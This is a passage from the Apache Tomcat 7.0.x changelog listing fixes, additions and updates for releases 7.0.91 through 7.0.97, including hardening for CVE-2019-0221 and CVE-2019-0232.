to avoid the expansion of `*`. Note that any newlines present in `CATALINA_OPTS` and/or `JAVA_OPTS` will no longer removed. (markt) | | --- | --- | | fix | [63826](https://bz.apache.org/bugzilla/show_bug.cgi?id=63826): Remove `commons-daemon-native.tar.gz` and `tomcat-native.tar.gz` from the binary zip distributions for Windows since compiled versions of those components are already included within the zip distributions. (markt) | | fix | [63833](https://bz.apache.org/bugzilla/show_bug.cgi?id=63833): Fix an error in the generification of the copied Commons DBCP 1.x code that caused a `NullPointerException` if a DataSource was configured with a database that did not exist. Patch provided by Guoxiong Li. (markt) | | fix | [63838](https://bz.apache.org/bugzilla/show_bug.cgi?id=63838): Suppress reflexive access warnings when running the unit tests on the command line. (markt) | | fix | Add missing charsets from the HPE JVM on HP-UX to pass unit tests in `org.apache.tomcat.util.buf.TestCharsetCache`. (michaelo) | | add | Expand the coverage and quality of the French translations provided with Apache Tomcat. (remm) | | add | Expand the coverage and quality of the Korean translations provided with Apache Tomcat. (woonsan) | | add | Expand the coverage and quality of the Simplified Chinese translations provided with Apache Tomcat. Contributions provided by rpo130, Mason Shen, leeyazhou, winsonzhao, qingshi huang, Lay, Shucheng Hou and Yanming Zhou. (markt) | | | |  | **Tomcat 7.0.97 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [57665](https://bz.apache.org/bugzilla/show_bug.cgi?id=57665): Add support for the `X-Forwarded-Host` header to the `RemoteIpFilter` and `RemoteIpValve`. (markt) | | --- | --- | | add | [62496](https://bz.apache.org/bugzilla/show_bug.cgi?id=62496): Add option to write auth information (remote user/auth type) to response headers. (michaelo) | | fix | [63550](https://bz.apache.org/bugzilla/show_bug.cgi?id=63550): Only try the `alternateURL` in the `JNDIRealm` if one has been specified. (markt) | | update | [63627](https://bz.apache.org/bugzilla/show_bug.cgi?id=63627): Implement more fine-grained handling in `RealmBase.authenticate(GSSContext, boolean)`. (michaelo) | | fix | Avoid a `NullPointerException` in the `CrawlerSessionManagerValve` if no ROOT Context is deployed and a request does not map to any of the other deployed Contexts. Patch provided by Jop Zinkweg. (markt) | | fix | [63636](https://bz.apache.org/bugzilla/show_bug.cgi?id=63636): `Context.findRoleMapping()` never called in `StandardWrapper.findSecurityReference()`. (michaelo) | | fix | Fix a crash on shutdown with the APR/native connector when a blocking I/O operation was still in progress when the connector stopped. (markt) | | fix | [63684](https://bz.apache.org/bugzilla/show_bug.cgi?id=63684): `Wrapper` never passed to `RealmBase.hasRole()` for given security constraints. (michaelo) | | fix | Avoid a potential `NullPointerException` on Service stop if a Service is embedded directly (i.e. with no Server) in an application and JNDI is enabled. Patch provided by S. Ali Tokmen. (markt) | | add | Add a new `PropertySource` implementation, `EnvironmentPropertySource`, that can be used to do property replacement in configuration files with environment variables. Based on a pull request provided by Thomas Meyer. (markt) | | fix | [63758](https://bz.apache.org/bugzilla/show_bug.cgi?id=63758): Include the XML schema for the tomcat-users.xml file in the binary distributions. (markt) | | fix | [63778](https://bz.apache.org/bugzilla/show_bug.cgi?id=63778): When running on Java 7, use the correct signature to look up the `DatabaseMetaData.getPseudoColumns()` method and avoid the `NullPointerException`s caused by using the wrong method. Add error logging to detect similar bugs. Based on a pull request by liguoxiong. (markt) | |  | **Coyote** | | --- | | | fix | [63571](https://bz.apache.org/bugzilla/show_bug.cgi?id=63571): Use the implementation default for JSSE TLS session cache size. (markt) | | --- | --- | | fix | [63578](https://bz.apache.org/bugzilla/show_bug.cgi?id=63578): Improve handling of invalid requests so that 400 responses are returned to the client rather than 500 responses. (markt) | | code | Remove the code in the sendfile poller that ensured smaller pollsets were used with older, no longer supported versions of Windows that could not support larger pollsets. (markt) | | fix | [63737](https://bz.apache.org/bugzilla/show_bug.cgi?id=63737): Correct various issues when parsing the `accept-encoding` header to determine if gzip encoding is supported including only parsing the first header found. (markt) | | fix | [63766](https://bz.apache.org/bugzilla/show_bug.cgi?id=63766): Ensure Processor objects are recycled when processing an HTTP upgrade connection that terminates before processing switches to the Processor for the upgraded protocol. (markt) | |  | **Jasper** | | --- | | | fix | [63781](https://bz.apache.org/bugzilla/show_bug.cgi?id=63781): When performing various checks related to the visibility of classes, fields an methods in the EL implementation, also check that the containing module has been exported. (markt) | | --- | --- | |  | **Web Socket** | | --- | | | fix | [63753](https://bz.apache.org/bugzilla/show_bug.cgi?id=63753): Ensure that the `Host` header in a Web Socket HTTP upgrade request only contains a port if a non-default port is being used. (markt) | | --- | --- | | fix | When running on Java 9 and above, don't attempt to instantiate WebSocket Endpoints found in modules that are not exported. (markt) | |  | **Web applications** | | --- | | | fix | Correct the source code links on the index page for the ROOT web application to point to Git rather than Subversion. (markt) | | --- | --- | | fix | Fix various issues with the Javadoc generated for the documentation web application to enable release builds to be built with Java 10 onwards. (markt) | | fix | Fix a large number of Javadoc and documentation typos. Patch provided by KangZhiDong. (markt) | | fix | Spelling and formatting corrections for the cluster how-to. Pull request provided by Bill Mitchell. (markt) | | docs | Add Javadoc for the Common Annotations API implementation. (markt) | |  | **jdbc-pool** | | --- | | | fix | When connections are validated without an explicit validation query, ensure that any transactions opened by the validation process are committed. Patch provided by Pascal Davoust. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | [55620](https://bz.apache.org/bugzilla/show_bug.cgi?id=55620): Partial fix. Prevent Tomcat from starting when `$CATALINA_HOME` and/or `$CATALINA_BASE` contains a semi-colon on Windows or a colon on Linux/FreeBSD/etc. (markt) | | --- | --- | | fix | [62140](https://bz.apache.org/bugzilla/show_bug.cgi?id=62140): Additional usage documentation in comments for `catalina.[bat|sh]`. (markt) | | add | [63285](https://bz.apache.org/bugzilla/show_bug.cgi?id=63285): Add an option to `service.bat` so that when installing a Windows service, the name of the executables used by the Windows service may be changed to match the service name. This makes the installation behaviour consistent with the Windows installer. The original executable names will be restored when the Windows service is removed. The renaming can be enabled by using the new `--rename` option after the service name. (markt) | | update | [63625](https://bz.apache.org/bugzilla/show_bug.cgi?id=63625): Update to Commons Daemon 1.2.1. This corrects several regressions in Commons Daemon 1.2.0, most notably the Windows Service crashing on start when using 32-bit JVMs. (markt) | | update | [63634](https://bz.apache.org/bugzilla/show_bug.cgi?id=63634): Align setproxy target in build.xml with 8.5/9.0. (michaelo) | | add | Limit the default JPDA (remote debugging interface) listen address to `localhost:8000`. (markt) | | update | Tighten up the default file permissions for the `.tar.gz` distribution so no files or directories are world readable by default. Configure Tomcat to run with a default umask of `0027` which may be overridden by setting `UMASK` in `setenv.sh`. (markt) | | fix | Allow customization of service.bat, such as heap memory size, service startup mode and JVM args. (isapir) | | update | Update the internal fork of Commons Codec to 3ebef4a (2018-08-01) to pick up the fix for CODEC-134. (markt) | | update | [63648](https://bz.apache.org/bugzilla/show_bug.cgi?id=63648): Update the test TLS keys and certificates used in the test suite to replace the keys and certificates that are about to expire. (markt) | | fix | Back-port various corrections and improvements to the English versions of the i18n messages. (markt) | | fix | Back-port various corrections and improvements to the Spanish i18n messages. (markt) | | fix | Back-port various corrections and improvements to the French i18n messages. (markt) | | fix | Back-port various corrections and improvements to the Japanese i18n messages. (markt) | | fix | Back-port various corrections and improvements to the Russian i18n messages. (markt) | | add | Include the available German translations in the standard Tomcat distribution. Back-port additions and updates to the German i18n messages. (markt) | | add | Add Korean translations to the standard Tomcat distribution. (markt) | | add | Add simplified Chinese translations to the standard Tomcat distribution. (markt) | | fix | Fix `JSSE_OPTS` quoting in `catalina.bat`. Contributed by Peter Uhnak. (fschumacher) | | fix | Remove unused i18n messages and associated translations. Patch provided by KangZhiDong. (markt) | | code | Deprecate `org.apache.tomcat.util.compat.TLS`. Its functionality was only used for unit tests in `org.apache.tomcat.util.net.TesterSupport` and has been moved there. (rjung) | | fix | When performing a silent install with the Windows Installer, ensure that the registry entries are added to the 64-bit registry when using a 64-bit JVM. (markt) | | fix | [63759](https://bz.apache.org/bugzilla/show_bug.cgi?id=63759): When installing Tomcat with the Windows installer, grant sufficient privileges to enable the uninstaller to execute when user account control is active. (markt) | | add | Use a build property to define the minimum supported Java version and use that build property to reduce the number of edits required to update the minimum supported Java version. (markt) | | update | [63767](https://bz.apache.org/bugzilla/show_bug.cgi?id=63767): Update to Commons Daemon 1.2.2. This corrects a regression in Commons Daemon 1.2.0 and 1.2.1 that caused the Windows Service to crash on start when running on an operating system that had not been fully updated. (markt) | | | |  | **Tomcat 7.0.96 (violetagg)** | **released 2019-07-29** | | --- | --- | | | **Catalina** | | --- | | | fix | [63579](https://bz.apache.org/bugzilla/show_bug.cgi?id=63579): Correct parsing of malformed OPTIONS requests and reject them with a 400 response rather than triggering an internal error that results in a 500 response. (markt) | | --- | --- | |  | **Coyote** | | --- | | | fix | Correct parsing of invalid host names that contain bytes in the range 128 to 255 and reject them with a 400 response rather than triggering an internal error that results in a 500 response. (markt) | | --- | --- | |  | **WebSocket** | | --- | | | fix | Correct a regression that prevented a default Tomcat 7 install from starting on Java 6. (markt) | | --- | --- | |  | **Other** | | --- | | | add | Enable the unit tests to execute in parallel. (markt) | | --- | --- | | | |  | **Tomcat 7.0.95 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [43548](https://bz.apache.org/bugzilla/show_bug.cgi?id=43548): Add an XML schema for the tomcat-users.xml file. (markt) | | --- | --- | | fix | [63324](https://bz.apache.org/bugzilla/show_bug.cgi?id=63324): Refactor the `CrawlerSessionManagerValve` so that the object placed in the session is compatible with session serialization with mem-cached. Patch provided by Martin Lemanski. (markt) | | fix | [63531](https://bz.apache.org/bugzilla/show_bug.cgi?id=63531): Refactor authenticators so that the session last accessed time is not updated if the cache attribute is set to `false` and `FORM` authentication is not being used. (markt) | | add | [63556](https://bz.apache.org/bugzilla/show_bug.cgi?id=63556): Mark request as forwarded in RemoteIpValve and RemoteIpFilter (michaelo) | | fix | Fix a potential resource leak when executing CGI scripts from a WAR file. Identified by Coverity scan. (markt) | | fix | Fix a potential concurrency issue in the StringCache identified by Coverity scan. (markt) | | fix | Fix a potential concurrency issue in the main Sendfile thread of the APR connector. Identified by Coverity scan. (markt) | | fix | Fix a potential resource leak on some exception paths in the `DataSourceRealm`. Identified by Coverity scan. (markt) | | fix | Fix a potential resource leak on an exception path when parsing JSP files. Identified by Coverity scan. (markt) | | fix | Fix a potential resource leak when a JNDI lookup returns an object of an in compatible class. Identified by Coverity scan. (markt) | | code | Refactor `ManagerServlet` to avoid loading classes when filtering JNDI resources for resources of a specified type. (markt) | | fix | Avoid a `NullPointerException` when a `Context` is defined in `server.xml` with a `docBase` but not the optional `path`. (markt) | | fix | Ensure that the default servlet reads the entire global XSLT file if one is defined. Identified by Coverity Scan. (markt) | | fix | Avoid potential `NullPointerException` when generating an HTTP `Allow` header. Identified by Coverity Scan. (markt) | | add | Remove any fragment included in the target path used to obtain a `RequestDispatcher`. The requested target path is logged as a warning since this is an application error. (markt) | | update | Modify the Default and WebDAV Servlets so that a 405 status code is returned for `PUT` and `DELETE` requests when disabled via the `readonly` initialisation parameter. | | fix | Align the contents of the `Allow` header with the response code for the Default and WebDAV Servlets. For any given resource a method that returns a 405 status code will not be listed in the `Allow` header and a method listed in the `Allow` header will not return a 405 status code. (markt) | | fix | Correct two failing tests from the Litmus test suite for WebDAV when copying/moving a file over a collection. (markt) | | update | Update the recommended minimum Tomcat Native version to 1.2.23. (markt) | | fix | If an unhandled exception occurs on a asynchronous thread started via `AsyncContext.start(Runnable)`, process it using the standard error page mechanism. (markt) | |  | **Coyote** | | --- | | | code | Refactor Hostname validation to improve performance. Patch provided by Uwe Hees. (markt) | | --- | --- | | fix | Fix to avoid the possibility of long poll times for individual pollers when using multiple pollers with APR. (markt) | | fix | Refactor the fix for [63205](https://bz.apache.org/bugzilla/show_bug.cgi?id=63205) so it only applies when using PKCS12 keystores as regressions have been reported with some other keystore types. (markt) | |  | **Jasper** | | --- | | | add | Include file names in error messages if SMAP processor is unable to delete or rename a class file during SMAP generation. (markt) | | --- | --- | | fix | Improvements to varargs handling in the Java UEL implementation. (markt) | |  | **Cluster** | | --- | | | fix | [62841](https://bz.apache.org/bugzilla/show_bug.cgi?id=62841): Refactor the `DeltaRequest` serialization to reduce the window during which the `DeltaSession` is locked and to remove a potential cause of deadlocks during serialization. (markt) | | --- | --- | | fix | [63441](https://bz.apache.org/bugzilla/show_bug.cgi?id=63441): Further streamline the processing of session creation messages in the `DeltaManager` to reduce the possibility of a session update message being processed before the session has been created. (markt) | |  | **WebSocket** | | --- | | | fix | [63521](https://bz.apache.org/bugzilla/show_bug.cgi?id=63521): As required by the WebSocket specification, if a POJO that is deployed as a result of the SCI scan for annotated POJOs is subsequently deployed via the programmatic API ignore the programmatic deployment. (markt) | | --- | --- | |  | **Tribes** | | --- | | | fix | Treat `NoRouteToHostException` the same way as `SocketTimeoutException` when checking the health of group members. This avoids a SEVERE log message every time the check is performed when the host associated with a group member is not powered on. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | [55969](https://bz.apache.org/bugzilla/show_bug.cgi?id=55969): Tighten up the security of the Apache Tomcat installation created by the Windows installer. Change the default shutdown port used by the Windows installer from `8005` to `-1` (disabled). Limit access to the chosen installation directory to local administrators, Local System and Local Service. (markt) | | --- | --- | | add | [59871](https://bz.apache.org/bugzilla/show_bug.cgi?id=59871): Add a property (`timeFormat`) to JULI's `OneLineFormatter` to enable the format of the time stamp used in log messages to be configured. (markt) | | update | [63310](https://bz.apache.org/bugzilla/show_bug.cgi?id=63310): Update to Commons Daemon 1.2.0. This provides improved support for Java 11. This also changes the user configured by the Windows installer for the Windows service from `Local System` to the lower privileged `Local Service`. (markt) | | fix | [63335](https://bz.apache.org/bugzilla/show_bug.cgi?id=63335): Ensure that stack traces written by the `OneLineFormatter` are fully indented. The entire stack trace is now indented by an additional TAB character. (markt) | | fix | When using the `OneLineFormatter`, don't print a blank line in the log after printing a stack trace. (markt) | | fix | Use the `test` command to check for terminal availability rather than the `tty` command since the `tty` based test fails on non-English locales. Patch provided by Radosław Józwik. (markt) | | update | Update JUnit to version 4.12. (markt) | | update | Update optional WSDL dependency to 1.6.3. (markt) | | update | Update Checkstyle to version 8.22. (markt) | | | |  | **Tomcat 7.0.94 (markt)** | **released 2019-04-12** | | --- | --- | | | **Catalina** | | --- | | | fix | [63196](https://bz.apache.org/bugzilla/show_bug.cgi?id=63196): Provide a default (`X-Forwarded-Proto`) for the `protocolHeader` attribute of the `RemoteIpFilter` and `RemoteIpValve`. (markt) | | --- | --- | | add | [63206](https://bz.apache.org/bugzilla/show_bug.cgi?id=63206): Add a new attribute to `Context` - `createUploadTargets` which, if `true` enables Tomcat to create the temporary upload location used by a Servlet if the location specified by the Servlet does not already exist. The default value is `false`. (markt) | | fix | [63213](https://bz.apache.org/bugzilla/show_bug.cgi?id=63213): Ensure the correct escaping of group names when searching for nested groups when the JNDIRealm is configured with `roleNested` set to `true`. (markt) | | fix | [63235](https://bz.apache.org/bugzilla/show_bug.cgi?id=63235): Refactor Charset cache to reduce start time. (markt) | | fix | [63236](https://bz.apache.org/bugzilla/show_bug.cgi?id=63236): Use `String.intern()` as suggested by Phillip Webb to reduce memory wasted due to String duplication. This changes saves ~245k when starting a clean installation. With additional thanks to YourKit Java profiler for helping to track down the wasted memory and the root causes. (markt) | | fix | [63246](https://bz.apache.org/bugzilla/show_bug.cgi?id=63246): Fix a potential `NullPointerException` when calling `AsyncContext.dispatch()`. (markt) | | fix | [63249](https://bz.apache.org/bugzilla/show_bug.cgi?id=63249): Use a consistent log level (`WARN`) when logging the failure to register or deregister a JMX Bean. (markt) | | fix | [63249](https://bz.apache.org/bugzilla/show_bug.cgi?id=63249): Use a consistent log level (`ERROR`) when logging the `LifecycleException` associated with the failure to start or stop a component. (markt) | | fix | When the SSI directive `fsize` is used with an invalid target, return a file size of `-` rather than `1k`. (markt) | | fix | [63251](https://bz.apache.org/bugzilla/show_bug.cgi?id=63251): Implement a work-around for a known JRE bug ([JDK-8194653](https://bugs.openjdk.java.net/browse/JDK-8194653)) that may cause a dead-lock when Tomcat starts. (markt) | | fix | Ensure that the JarScanner correctly tests whether JARs found on the class path should be skipped when running on Java 9 or later. (markt) | | fix | [63275](https://bz.apache.org/bugzilla/show_bug.cgi?id=63275): When using a `RequestDispatcher` ensure that `HttpServletRequest.getContextPath()` returns an encoded path in the dispatched request. (markt) | | fix | [63286](https://bz.apache.org/bugzilla/show_bug.cgi?id=63286): Document the differences in behaviour between the `LogFormat` directive in httpd and the `pattern` attribute in the `AccessLogValve` for `%D` and `%T`. (markt) | | fix | [63311](https://bz.apache.org/bugzilla/show_bug.cgi?id=63311): Add support for https URLs to the local resolver within Tomcat used to resolve standard XML DTDs and schemas when Tomcat is configured to validate XML configuration files such as web.xml. (markt) | | fix | Encode the output of the SSI `printenv` command. This is the fix for CVE-2019-0221. (markt) | | code | Use constants for SSI encoding values. (markt) | | add | When the CGI Servlet is configured with `enableCmdLineArguments` set to true, limit the encoded form of the individual command line arguments to those values allowed by RFC 3875. This restriction may be relaxed by the use of the new initialisation parameter `cmdLineArgumentsEncoded`. (markt) | | add | When the CGI Servlet is configured with `enableCmdLineArguments` set to true, limit the decoded form of the individual command line arguments to known safe values when running on Windows. This restriction may be relaxed by the use of the new initialisation parameter `cmdLineArgumentsDecoded`. This is the fix for CVE-2019-0232. (markt) | | update | Change the default for the `enableCmdLineArguments` parameter of the CGI servlet from `true` to `false` as additional hardening against CVE-2019-0232. (markt) | |  | **Coyote** | | --- | | | fix | [63194](https://bz.apache.org/bugzilla/show_bug.cgi?id=63194): Fix failing unit test so TLS1.3 client authentication tests work correctly when using Java 11 onwards and the APR/Native connector. (markt) | | --- | --- | | add | [63205](https://bz.apache.org/bugzilla/show_bug.cgi?id=63205): Add a work-around for a known [JRE KeyStore loading bug](https://bugs.openjdk.java.net/browse/JDK-8157404). (markt) | |  | **Jasper** | | --- | | | add | Add support for specifying Java 11 (with the value `11`) as the compiler source and/or compiler target for JSP compilation. (markt) | | --- | --- | | add | Add support for specifying Java 12 (with the value `12`) and Java 13 (with the value `13`) as the compiler source and/or compiler target for JSP compilation. If used with an ECJ version that does not support these values, a warning will be logged and the latest supported version will used. Based on a patch by Thomas Collignon. (markt) | |  | **Web applications** | | --- | | | fix | [63184](https://bz.apache.org/bugzilla/show_bug.cgi?id=63184): Expand the SSI documentation to provide more information on the supported directives and their attributes. Patch provided by nightwatchcyber. (markt) | | --- | --- | |  | **jdbc-pool** | | --- | | | fix | [63320](https://bz.apache.org/bugzilla/show_bug.cgi?id=63320): Ensure that `StatementCache` caches statements that include arrays in arguments. (kfujino) | | --- | --- | |  | **Other** | | --- | | | code | Copy Apache Commons DBCP 1.4 and Apache Commons Pool 1.5.7 source code into the Tomcat 7.0.x tree to enable additional fixes to be pulled in. (markt) | | --- | --- | | fix | Update the copy of Apache Commons DBCP 1.4.x and Apache Commons pool 1.5.x to the latest source code as of 2019-03-15 to pick up multiple bug fixes including [58338](https://bz.apache.org/bugzilla/show_bug.cgi?id=58338). (markt) | | code | Update the copy of Apache Commons Pool to 1.6.x to pick up the generics changes. (markt) | | add | Add JDBC 4.1 support to the default database connection pool provided by Tomcat. (markt) | | update | Switch from Checkstyle to the JRE6 backport and update to version 8.17. This allows Tomcat 7 to use the newer configuration format (required by Gump that uses the latest Checkstyle snapshot) while still building with Java 6. (markt) | | | |  | **Tomcat 7.0.93 (violetagg)** | **released 2019-02-21** | | --- | --- | | | **Catalina** | | --- | | | fix | [54741](https://bz.apache.org/bugzilla/show_bug.cgi?id=54741): Add a new method, `Tomcat.addWebapp(String,URL)`, that allows a web application to be deployed from a URL when using Tomcat in embedded mode. (markt) | | --- | --- | | add | [62897](https://bz.apache.org/bugzilla/show_bug.cgi?id=62897): Provide a property (`clearReferencesThreadLocals`) on the standard `Context` implementation that enables the check for memory leaks via `ThreadLocal`s to be disabled because this check depends on the use of an API that has been deprecated in later versions of Java. (markt) | | fix | [62978](https://bz.apache.org/bugzilla/show_bug.cgi?id=62978): Update the RemoteIpValve to handle multiple values in the `x-forwarded-proto` header. Patch provided by Tom Groot. (markt) | | fix | Update the RemoteIpFilter to handle multiple values in the `x-forwarded-proto` header. Based on a patch provided by Tom Groot. (markt) | | code | [62986](https://bz.apache.org/bugzilla/show_bug.cgi?id=62986): Refactor the code that performs class scanning during web application start to make integration simpler for downstream users. Based on a patch provided by rmannibucau. (markt) | | fix | Implement the requirements of section 8.2.2 2c of the Servlet specification and prevent a web application from deploying if it has fragments with duplicate names and is configured to use relative ordering of fragments. (markt) | | update | Update the recommended minimum Tomcat Native version to 1.2.19. (markt) | | fix | Ensure that the `ServletOutputStream` implementation is consistent with the requirements of asynchronous I/O and that all of the write methods use a single write rather than multiple writes. (markt) | | fix | Correct the Javadoc for `Context.getDocBase()` and `Context.setDocBase()` and remove text that indicates that a URL may be used for the `docBase` as this has not been the case for quite some time. (markt) | | add | Ensure that Tomcat is fully terminated when running as a service. (markt) | | fix | [63003](https://bz.apache.org/bugzilla/show_bug.cgi?id=63003): Extend the `unloadDelay` attribute on a `Context` to include in-flight asynchronous requests. (markt) | | add | [63026](https://bz.apache.org/bugzilla/show_bug.cgi?id=63026): Add a new attribute, `forceDnHexEscape`, to the `JNDIRealm` that forces escaping in the String representation of a distinguished name to use the `\nn` form. This may avoid issues with realms using Active Directory which appears to be more tolerant of optional escaping when the `\nn` form is used. (markt) | | update | Update the recommended minimum Tomcat Native version to 1.2.21. (markt) | | update | Simplify the value of `jarsToSkip` property in `catalina.properties` file for tomcat-i18n jar files. Use prefix pattern instead of listing each language. (kkolinko) | |  | **WebSocket** | | --- | | | fix | [57974](https://bz.apache.org/bugzilla/show_bug.cgi?id=57974): Ensure implementation of `Session.getOpenSessions()` returns correct value for both client-side and server-side calls. (markt) | | --- | --- | | fix | [63019](https://bz.apache.org/bugzilla/show_bug.cgi?id=63019): Use payload remaining bytes rather than limit when writing. Submitted by Benoit Courtilly. (remm) | | fix | When running under a `SecurityManager`, ensure that the `ServiceLoader` look-up for the default `javax.websocket.server.ServerEndpointConfig.Configurator` implementation completes correctly rather than silently using the hard-coded fall-back. (markt) | | fix | Ensure that the network connection is closed if the client receives an I/O error trying to communicate with the server. (markt) | | fix | Ignore synthetic methods when scanning POJO methods. (markt) | | fix | Implement the requirements of section 5.2.1 of the WebSocket 1.1 specification and ensure that if the deployment of one Endpoint fails, no Endpoints are deployed for that web application. (markt) | | fix | Implement the requirements of section 4.3 of the WebSocket 1.1 specification and ensure that the deployment of an Endpoint fails if `@PathParam` is used with an invalid parameter type. (markt) | | fix | Ensure a `DeploymentException` rather than an `IllegalArgumentException` is thrown if a method annotated with `@OnMessage` does not conform to the requirements set out in the Javadoc. (markt) | | fix | Improve algorithm that determines if two `@OnMessage` annotations have been added for the same message type. Prior to this change some matches were missed. (markt) | | code | Remove the `STREAMS_DROP_EMPTY_MESSAGES` system property that was introduced to work-around four failing TCK tests. An alternative solution has been implemented. Sending messages via `getSendStream()` and `getSendWriter()` will now only result in messages on the wire if data is written to the `OutputStream` or `Writer`. Writing zero length data will result in an empty message. Note that sending a message via an `Encoder` may result in the message being send via `getSendStream()` or `getSendWriter()`. (markt) | |  | **Web applications** | | --- | | | fix | [63103](https://bz.apache.org/bugzilla/show_bug.cgi?id=63103): Remove the unused source.jsp file and associated tag from the examples web application as it is no longer used. (markt) | | --- | --- | | fix | [63143](https://bz.apache.org/bugzilla/show_bug.cgi?id=63143): Ensure that the Manager web application respects the language preferences of the user as configured in the browser when the language of the default system locale is not English. (markt) | | fix | Use client's preferred language for the Server Status page of the Manager web application. Review and fix several cases when the client's language preference was not respected in Manager and Host Manager web applications. (kkolinko) | | fix | Fix messages used by Manager and Host Manager web applications. Disambiguate message keys used when adding or removing a host. Improve display of summary values on the status page: separate terms and values with a whitespace. Improve wording of messages for expire sessions command. (kkolinko) | | fix | Do not add CSRF nonce parameter and suppress Referer header for external links in Manager and Host Manager web applications. (kkolinko) | |  | **Other** | | --- | | | fix | Prevent an error when running in a Cygwin shell and the `JAVA_ENDORSED_DIRS` system property is empty. Patch provided by Zemian Deng. (markt) | | --- | --- | | update | Update the packaged version of the Tomcat Native Library to 1.2.19 to pick up the latest Windows binaries built with APR 1.6.5 and OpenSSL 1.1.1a. (markt) | | fix | Correct AsyncFileHandler to FileHandler in logging.properties. (huxing) | | update | Update the packaged version of the Tomcat Native Library to 1.2.21 to pick up the memory leak fixes when using NIO/NIO2 with OpenSSL. (markt) | | fix | Enable compilation and test execution with Java 11. Note that the deprecated class `org.apache.catalina.util.Base64` will be excluded from the build in this case as it depends on JRE classes that have been removed in Java 11 onwards. (markt) | | update | Update the NSIS Installer used to build the Windows installer to version 3.04. (markt) | | add | Expand the coverage and quality of the Russian translations provided with Apache Tomcat. (kkolinko) | | | |  | **Tomcat 7.0.92 (violetagg)** | **released 2018-11-15** | | --- | --- | | | **Catalina** | | --- | | | fix | Add documentation about the files `context.xml.default` and `web.xml.default` that can be used to customize `conf/context.xml` and `conf/web.xml` on a per host basis. (fschumacher) | | --- | --- | | fix | Ensure that a canonical path is always used for the docBase of a Context to ensure consistent behaviour. (markt) | | fix | [62788](https://bz.apache.org/bugzilla/show_bug.cgi?id=62788): Add explicit logging configuration to write log files using UTF-8 to align with Tomcat's use of UTF-8 by default elsewhere. (markt) | | fix | [62797](https://bz.apache.org/bugzilla/show_bug.cgi?id=62797): Pass throwable to keep client aborts with status 200 rather than 500. Patch submitted by zikfat. (remm) | | fix | [62809](https://bz.apache.org/bugzilla/show_bug.cgi?id=62809): Correct a regression in the implementation of DIGEST authentication support for the Deployer Ant tasks (bug [45832](https://bz.apache.org/bugzilla/show_bug.cgi?id=45832)) that prevented the `DeployTask` from working when authentication was required. (markt) | | update | Update the recommended minimum Tomcat Native version to 1.2.18. (markt) | | add | Ignore an attribute named `source` on `Context` elements provided by `StandardContext`. This is to suppress warnings generated by the Eclipse / Tomcat integration provided by Eclipse. Based on a patch by mdfst13. (markt) | | add | [62830](https://bz.apache.org/bugzilla/show_bug.cgi?id=62830): Added `JniLifeCycleListener` and static methods `Library.loadLibrary(libraryName)` and `Library.load(filename)` to load a native library by a shared class loader so that more than one Webapp can use it. (isapir) | | fix | Correct a typo in the Spanish resource files. Patch provided by Diego Agulló. (markt) | | fix | [62868](https://bz.apache.org/bugzilla/show_bug.cgi?id=62868): Order the `Enumeration<URL>` provided by `WebappClassLoaderBase.getResources(String)` according to the setting of the delegate flag. (markt) | |  | **Coyote** | | --- | | | add | Add TLSv1.3 to the default protocols and to the `all` alias for JSSE based TLS connectors when running on a JVM that supports TLS version 1.3. One such JVM is OpenJDK version 11. (rjung) | | --- | --- | | fix | [62739](https://bz.apache.org/bugzilla/show_bug.cgi?id=62739): Do not reject requests with an empty HTTP Host header. Such requests are unusual but not invalid. Patch provided by Michael Orr. (markt) | | add | [62748](https://bz.apache.org/bugzilla/show_bug.cgi?id=62748): Add TLS 1.3 support for the APR/Native connector. (schultz/markt) | | fix | [62791](https://bz.apache.org/bugzilla/show_bug.cgi?id=62791): Remove an unnecessary check in the NIO TLS implementation that prevented from secure WebSocket connections from being established. (markt) | |  | **Jasper** | | --- | | | fix | [62674](https://bz.apache.org/bugzilla/show_bug.cgi?id=62674): Correct a regression in the stand-alone JSP compiler utility, `JspC`, caused by the fix for [53492](https://bz.apache.org/bugzilla/show_bug.cgi?id=53492), that caused the JSP compiler to hang. (markt) | | --- | --- | | fix | [62721](https://bz.apache.org/bugzilla/show_bug.cgi?id=62721): Correct generation of web.xml header when using JspC. (markt) | | fix | Fix a regression in the TLD whitespace parsing fix that broke parsing when whitespace was present between the method name and the parameters. (markt) | | fix | [62757](https://bz.apache.org/bugzilla/show_bug.cgi?id=62757): Correct a regression in the fix for [62603](https://bz.apache.org/bugzilla/show_bug.cgi?id=62603) that caused `NullPointerException`s when compiling tag files on first access when development mode was disabled and background compilation was enabled. Based on a patch by Jordi Llach. (markt) | | fix | [62808](https://bz.apache.org/bugzilla/show_bug.cgi?id=62808): Fix a regression in the TLD whitespace parsing fix that broke parsing when new lines were present in the method signature. (markt) | |  | **WebSocket** | | --- | | | fix | [62731](https://bz.apache.org/bugzilla/show_bug.cgi?id=62731): Make the URI returned by `HandshakeRequest.getRequestURI()` and `Session.getRequestURI()` absolute so that the scheme, host and port are accessible. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | [62761](https://bz.apache.org/bugzilla/show_bug.cgi?id=62761): Correct the advanced CORS example in the Filter documentation to use a valid configuration. (markt) | | --- | --- | | fix | [62786](https://bz.apache.org/bugzilla/show_bug.cgi?id=62786): Add a note to the Context documentation to explain that, by default, settings for a Context element defined in server.xml will be overwritten by settings specified in a default context file such as `conf/context.xml`. (markt) | | fix | Create a little visual separation between the Undeploy button and the other buttons in the Manager application. Patch provided by Łukasz Jąder. (markt) | |  | **Other** | | --- | | | update | Update the packaged version of the Tomcat Native Library to 1.2.18 to pick up the latest Windows binaries built with APR 1.6.5 and OpenSSL 1.1.1. (markt) | | --- | --- | | | |  | **Tomcat 7.0.91 (violetagg)** | **released 2018-09-19** | | --- | --- | | | **Catalina** | | --- | | | add | [61692](https://bz.apache.org/bugzilla/show_bug.cgi?id=61692): Add the ability to control which HTTP methods are handled by the CGI Servlet via a new initialization parameter `cgiMethods`. (markt) | | --- | --- | | fix | Ensure that the HTTP Vary header is set correctly when using the CORS filter and improve the cacheability of requests that pass through the COPRS filter. (markt) | | fix | [62527](https://bz.apache.org/bugzilla/show_bug.cgi?id=62527): Revert restriction of JNDI to the `java:` namespace. (remm) | | add | Introduce a new class - `MultiThrowable` - to report exceptions when multiple actions are taken where each action may throw an exception but all actions are taken before any errors are reported. Use this new class when reporting multiple container (e.g. web application) failures during start. (markt) | | fix | Correctly decode URL paths (`+` should not be decoded to a space in the path) in the 